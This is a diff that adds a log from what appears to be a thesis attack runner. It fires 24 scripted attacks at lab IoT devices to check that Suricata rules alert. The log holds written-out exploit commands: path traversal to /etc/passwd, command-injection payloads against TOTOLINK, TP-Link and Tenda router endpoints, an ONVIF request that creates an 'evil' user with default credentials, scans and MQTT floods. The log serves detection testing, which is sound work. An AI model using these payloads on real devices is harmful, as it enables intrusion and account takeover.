@@ -1,0 +1,401 @@
+BA Attack Runner started: 2026-01-29 10:43:56
+Config: /mnt/Bachelorarbeit/Abgabe_Bachelorarbeit/attacks_v2_min.json
+Fastlog: /var/log/suricata/fast.log
+Outdir: /mnt/Bachelorarbeit/Abgabe_Bachelorarbeit/attack_runs/20260129_104356
+Enabled attacks: 24/24
+==========================================================================================
+[1/24] RTSP-1 - RTSP: Multiple DESCRIBE requests (6x) to /stream1
+Command: bash -c 'for i in {1..6}; do printf "DESCRIBE rtsp://10.10.0.6:8554/stream1 RTSP/1.0\r\nCSeq: %s\r\nUser-Agent: BA-AttackRunner\r\n\r\n" "$i" | nc -w 2 10.10.0.6 8554 >/dev/null 2>&1; done'
+Post-wait: 2.0s
+rc=0 runtime=12.07s attack_check=PASS
+Expected SIDs: [9000001]
+Observed SIDs: [9000001]
+==========================================================================================
+[2/24] RTSP-2 - RTSP: Path probing causing many 404 responses (triggers 9000002 detection_filter)
+Command: python3 - <<'PY'
+import socket, time
+host="10.10.0.6"; port=8554
+method="DESCRIBE"
+path="/nonexistent_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+full_url=True
+headers={}
+body=""
+for i in range(25):
+    target = f"rtsp://{host}:{port}{path}" if full_url else path
+    hdrs = dict(headers)
+    hdrs.setdefault("CSeq", str(i+1))
+    hdrs.setdefault("User-Agent", "BA-AttackRunner")
+    req = f"{method} {target} RTSP/1.0\r\n" + "".join(f"{k}: {v}\r\n" for k,v in hdrs.items()) + "\r\n"
+    payload = req.encode("utf-8", errors="ignore") + (body.encode("utf-8", errors="ignore") if body else b"")
+    s = socket.create_connection((host, port), timeout=3)
+    s.sendall(payload)
+    try:
+        s.recv(512)
+    except Exception:
+        pass
+    s.close()
+    time.sleep(0.02)
+PY
+Post-wait: 2.0s
+rc=0 runtime=0.61s attack_check=PASS
+Expected SIDs: [9000002]
+Observed SIDs: [9000002]
+==========================================================================================
+[3/24] RTSP-3 - RTSP: ANNOUNCE with overlong SDP attribute line (triggers 9000003)
+Command: python3 - <<'PY'
+import socket
+host="10.10.0.6"; port=8554
+path="/stream"
+value = "A"*220
+sdp = "\r\n".join([
+    "v=0",
+    "o=- 0 0 IN IP4 127.0.0.1",
+    "s=-",
+    "t=0 0",
+    f"a=tool:{value}",
+    ""
+])
+req = (
+    f"ANNOUNCE rtsp://{host}:{port}{path} RTSP/1.0\r\n"
+    "CSeq: 1\r\n"
+    "User-Agent: BA-AttackRunner\r\n"
+    "Content-Type: application/sdp\r\n"
+    f"Content-Length: {len(sdp.encode())}\r\n"
+    "\r\n"
+    + sdp
+)
+s = socket.create_connection((host, port), timeout=3)
+s.sendall(req.encode("ascii", errors="ignore"))
+try:
+    s.recv(512)
+except Exception:
+    pass
+s.close()
+PY
+Post-wait: 2.0s
+rc=0 runtime=0.04s attack_check=PASS
+Expected SIDs: [9000003]
+Observed SIDs: [9000003]
+==========================================================================================
+[4/24] RTSP-4 - RTSP: Path traversal in request-target (triggers 9000004)
+Command: python3 - <<'PY'
+import socket, time
+host="10.10.0.6"; port=8554
+method="OPTIONS"
+path="/%2e%2e%2f%2e%2e%2fetc/passwd"
+full_url=True
+headers={}
+body=""
+for i in range(1):
+    target = f"rtsp://{host}:{port}{path}" if full_url else path
+    hdrs = dict(headers)
+    hdrs.setdefault("CSeq", str(i+1))
+    hdrs.setdefault("User-Agent", "BA-AttackRunner")
+    req = f"{method} {target} RTSP/1.0\r\n" + "".join(f"{k}: {v}\r\n" for k,v in hdrs.items()) + "\r\n"
+    payload = req.encode("utf-8", errors="ignore") + (body.encode("utf-8", errors="ignore") if body else b"")
+    s = socket.create_connection((host, port), timeout=3)
+    s.sendall(payload)
+    try:
+        s.recv(512)
+    except Exception:
+        pass
+    s.close()
+    time.sleep(0.0)
+PY
+Post-wait: 60.0s
+rc=0 runtime=0.05s attack_check=PASS
+Expected SIDs: [9000004]
+Observed SIDs: [9000001, 9000004]
+==========================================================================================
+[5/24] RTSP-5 - RTSP: Overlong Session header value (triggers 9000005)
+Command: longsession=$(openssl rand -base64 200); printf $'DESCRIBE rtsp://10.10.0.6:8554/stream1 RTSP/1.0\r\nCSeq: 3\r\nSession: %s\r\nUser-Agent: session-fuzz\r\n\r\n' "$longsession" | nc -N 10.10.0.6 8554
+Post-wait: 2.0s
+rc=0 runtime=0.02s attack_check=FAIL
+Expected SIDs: [9000005]
+Observed SIDs: (none)
+Missing SIDs: [9000005]
+==========================================================================================
+[6/24] TELNET-1 - HTTP: GET /shell (triggers 9000006)
+Command: curl -s --max-time 3 http://10.10.0.3:80/shell
+Post-wait: 2.0s
+rc=0 runtime=0.01s attack_check=PASS
+Expected SIDs: [9000006]
+Observed SIDs: [9000006]
+==========================================================================================
+[7/24] TELNET-2 - IoT host: UDP burst to external IP (triggers 9000007 detection_filter)
+Command: docker exec telnet-device python3 -c "import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=('1.1.1.1',12345); payload=b'A'*20; [s.sendto(payload, addr) for _ in range(150)]"
+Post-wait: 3.0s
+rc=0 runtime=0.10s attack_check=PASS
+Expected SIDs: [9000007]
+Observed SIDs: [9000007]
+==========================================================================================
+[8/24] TELNET-3 - IoT host: TCP connect scan to internal host ports (triggers 9000008 detection_filter)
+Command: docker exec telnet-device nmap -sV -O 10.10.0.4
+Post-wait: 3.0s
+rc=124 runtime=20.01s attack_check=PASS
+Expected SIDs: [9000008]
+Observed SIDs: [9000008]
+==========================================================================================
+[9/24] ROUTER-1 - Router: /login.cgi?cli= probe (triggers 9000009)
+Command: curl -s --max-time 3 'http://10.10.0.3:80/login.cgi?cli=whoami'
+Post-wait: 2.0s
+rc=0 runtime=0.01s attack_check=PASS
+Expected SIDs: [9000009]
+Observed SIDs: [9000009]
+==========================================================================================
+[10/24] ROUTER-2 - Router: ?images auth-bypass probe (triggers 9000010)
+Command: curl -s --max-time 3 'http://10.10.0.3:80/?images'
+Post-wait: 2.0s
+rc=0 runtime=0.01s attack_check=PASS
+Expected SIDs: [9000010]
+Observed SIDs: [9000010]
+==========================================================================================
+[11/24] ROUTER-3 - Router: TR-064 NewNTPServer=http://... (triggers 9000011)
+Command: curl -s --max-time 3 -X POST -H 'Content-Type: text/xml; charset=utf-8' --data '<NewNTPServer>http://evil.example/ntp</NewNTPServer>' http://10.10.0.3:7547/
+Post-wait: 2.0s
+rc=0 runtime=0.01s attack_check=PASS
+Expected SIDs: [9000011]
+Observed SIDs: [9000011]
+==========================================================================================
+[12/24] ROUTER-4 - Router: TOTOLINK downloadFlile.cgi payload injection (triggers 9000012 + 9000013)
+Command: curl -s --max-time 3 'http://10.10.0.3:80/cgi-bin/downloadFlile.cgi?payload=%60id%60'
+Post-wait: 2.0s
+rc=0 runtime=0.01s attack_check=PASS
+Expected SIDs: [9000012, 9000013]
+Observed SIDs: [9000012, 9000013]
+==========================================================================================
+[13/24] ROUTER-4.1 - Router: TOTOLINK downloadFile.cgi payload injection (triggers 9000014)
+Command: curl -s --max-time 3 'http://10.10.0.3:80/cgi-bin/downloadFile.cgi?payload=%60id%60'
+Post-wait: 2.0s
+rc=0 runtime=0.01s attack_check=PASS
+Expected SIDs: [9000014]
+Observed SIDs: [9000014]
+==========================================================================================
+[14/24] ROUTER-5 - Router: TP-Link country=... command injection pattern (triggers 9000015)
+Command: curl -s --max-time 3 'http://10.10.0.3:80/?country=DE%3Bid'
+Post-wait: 2.0s
+rc=0 runtime=0.01s attack_check=PASS
+Expected SIDs: [9000015]
+Observed SIDs: [9000015]
+==========================================================================================
+[15/24] ROUTER-6 - Router: Tenda WriteFacMac mac=... injection pattern (triggers 9000016)
+Command: curl -s --max-time 3 'http://10.10.0.3:80/goform/WriteFacMac?mac=AA:BB:CC:DD:EE:FF%3Bid'
+Post-wait: 2.0s
+rc=0 runtime=0.01s attack_check=PASS
+Expected SIDs: [9000016]
+Observed SIDs: [9000016]
+==========================================================================================
+[16/24] ROUTER-7 - Router: timezone injection (triggers 9000017)
+Command: curl -s --max-time 3 -X POST 'http://10.10.0.3/apply.cgi' --data-urlencode 'timezone=UTC;cat /etc/passwd'
+Post-wait: 2.0s
+rc=0 runtime=0.01s attack_check=PASS
+Expected SIDs: [9000017]
+Observed SIDs: [9000017]
+==========================================================================================
+[17/24] CAM-1 - Camera: Default BasicAuth admin:admin (triggers 9000018)
+Command: curl -s --max-time 3 -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://10.10.0.4:80/
+Post-wait: 2.0s
+rc=0 runtime=0.32s attack_check=PASS
+Expected SIDs: [9000018]
+Observed SIDs: [9000018]
+==========================================================================================
+[18/24] CAM-2 - Camera: GET /system.ini (triggers 9000019)
+Command: curl -s --max-time 3 http://10.10.0.4:80/system.ini
+Post-wait: 2.0s
+rc=0 runtime=3.00s attack_check=PASS
+Expected SIDs: [9000019]
+Observed SIDs: [9000019]
+==========================================================================================
+[19/24] CAM-3 - Camera: ONVIF SOAP CreateUsers (triggers 9000020)
+Command: python3 - <<'PY'
+import socket
+host="10.10.0.4"; port=80
+path="/onvif/device_service"
+nonce = "A"*32 + "=="
+xml = f'''<?xml version="1.0" encoding="UTF-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
+            xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
+  <s:Header>
+    <wsse:Security>
+      <wsse:UsernameToken>
+        <wsse:Username>admin</wsse:Username>
+        <wsse:Password>admin</wsse:Password>
+        <wsse:Nonce>{nonce}</wsse:Nonce>
+      </wsse:UsernameToken>
+    </wsse:Security>
+  </s:Header>
+  <s:Body>
+    <CreateUsers>
+      <User>
+        <Username>evil</Username>
+        <Password>evil</Password>
+      </User>
+    </CreateUsers>
+  </s:Body>
+</s:Envelope>
+'''
+req = (
+    f"POST {path} HTTP/1.1\r\n"
+    f"Host: {host}\r\n"
+    "User-Agent: BA-AttackRunner\r\n"
+    "Connection: close\r\n"
+    "Content-Type: application/soap+xml; charset=utf-8\r\n"
+    f"Content-Length: {len(xml.encode())}\r\n"
+    "\r\n"
+    + xml
+)
+s = socket.create_connection((host, port), timeout=3)
+s.sendall(req.encode("utf-8", errors="ignore"))
+try:
+    s.recv(512)
+except Exception:
+    pass
+s.close()
+PY
+Post-wait: 2.0s
+rc=0 runtime=2.99s attack_check=PASS
+Expected SIDs: [9000020]
+Observed SIDs: [9000020]
+==========================================================================================
+[20/24] CAM-4 - Camera: POST /res.php action=alarm with metachar (triggers 9000021)
+Command: curl -s -X POST http://10.10.0.4/res.php -H 'Content-Type: application/x-www-form-urlencoded' -d 'action=alarm&id=1;uname -a'
+Post-wait: 2.0s
+rc=0 runtime=2.99s attack_check=PASS
+Expected SIDs: [9000021]
+Observed SIDs: [9000021]
+==========================================================================================
+[21/24] MQTT-1 - MQTT: single CONNECT from external (triggers 9000022)
+Command: python3 - <<'PY'
+import socket, random, string
+host="10.10.0.5"; port=1883
+cid = "ba-connect"
+def enc_str(s):
+    b=s.encode()
+    return bytes([len(b)>>8, len(b)&0xff]) + b
+def rem_len(n):
+    out=bytearray()
+    x=n
+    while True:
+        digit=x%128
+        x//=128
+        if x>0: digit |= 0x80
+        out.append(digit)
+        if x==0: break
+    return bytes(out)
+vh = b"\x00\x04MQTT\x04" + bytes([0x02]) + b"\x00\x3c"
+payload = enc_str(cid)
+pkt = b"\x10" + rem_len(len(vh)+len(payload)) + vh + payload
+s=socket.create_connection((host,port), timeout=3)
+s.sendall(pkt)
+try: s.recv(4)
+except Exception: pass
+s.close()
+PY
+Post-wait: 2.0s
+rc=0 runtime=0.07s attack_check=PASS
+Expected SIDs: [9000022]
+Observed SIDs: [9000022]
+==========================================================================================
+[22/24] MQTT-2 - MQTT: CONNECT flood (triggers 9000023 detection_filter)
+Command: python3 - <<'PY'
+import socket, time, random, string
+host="10.10.0.5"; port=1883
+def rand_cid():
+    suf="".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(8))
+    return "ba-flood-"+suf
+def enc_str(s):
+    b=s.encode()
+    return bytes([len(b)>>8, len(b)&0xff]) + b
+def rem_len(n):
+    out=bytearray()
+    x=n
+    while True:
+        digit=x%128
+        x//=128
+        if x>0: digit |= 0x80
+        out.append(digit)
+        if x==0: break
+    return bytes(out)
+vh = b"\x00\x04MQTT\x04" + bytes([0x02]) + b"\x00\x3c"
+for i in range(12):
+    cid = rand_cid()
+    payload = enc_str(cid)
+    pkt = b"\x10" + rem_len(len(vh)+len(payload)) + vh + payload
+    s=socket.create_connection((host,port), timeout=3)
+    s.sendall(pkt)
+    try: s.recv(4)
+    except Exception: pass
+    s.close()
+    time.sleep(0.0)
+PY
+Post-wait: 2.0s
+rc=0 runtime=0.07s attack_check=PASS
+Expected SIDs: [9000023]
+Observed SIDs: [9000022, 9000023]
+==========================================================================================
+[23/24] MQTT-3 - MQTT: PUBLISH to exec/server with debug exec (triggers 9000024)
+Command: python3 - <<'PY'
+import socket
+host="10.10.0.5"; port=1883
+topic="acme/device/dev123/exec/server"
+message="debug exec"
+client_id="ba-pub"
+
+def enc_str(s):
+    b=s.encode()
+    return bytes([len(b)>>8, len(b)&0xff]) + b
+def rem_len(n):
+    out=bytearray()
+    x=n
+    while True:
+        digit=x%128
+        x//=128
+        if x>0: digit |= 0x80
+        out.append(digit)
+        if x==0: break
+    return bytes(out)
+
+vh = b"\x00\x04MQTT\x04" + bytes([0x02]) + b"\x00\x3c"
+pl = enc_str(client_id)
+connect = b"\x10" + rem_len(len(vh)+len(pl)) + vh + pl
+
+t = enc_str(topic)
+m = message.encode()
+publish = b"\x30" + rem_len(len(t)+len(m)) + t + m
+
+s=socket.create_connection((host,port), timeout=3)
+s.sendall(connect)
+try: s.recv(4)
+except Exception: pass
+s.sendall(publish)
+try:
+    s.shutdown(socket.SHUT_WR)
+except Exception:
+    pass
+s.close()
+PY
+Post-wait: 2.0s
+rc=0 runtime=0.06s attack_check=PASS
+Expected SIDs: [9000024]
+Observed SIDs: [9000022, 9000023, 9000024]
+==========================================================================================
+[24/24] COAP-1 - CoAP: POST payload with cmd=... (triggers 9000025)
+Command: python3 - <<'PY'
+import socket, random
+host="10.10.0.5"; port=5683
+mid = random.randint(0, 0xFFFF)
+hdr = bytes([0x40, 0x02, (mid>>8)&0xff, mid&0xff])  # Ver=1, Type=CON, TKL=0, Code=POST
+payload = b"\xff" + ("cmd=id".encode())
+pkt = hdr + payload
+s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.sendto(pkt, (host, port))
+s.close()
+PY
+Post-wait: 2.0s
+rc=0 runtime=0.05s attack_check=PASS
+Expected SIDs: [9000025]
+Observed SIDs: [9000025]
+==========================================================================================
+SUMMARY
+PASS=23 FAIL=1
+Artifacts: attack_runs/20260129_104356/run.log , attack_runs/20260129_104356/run_report.json
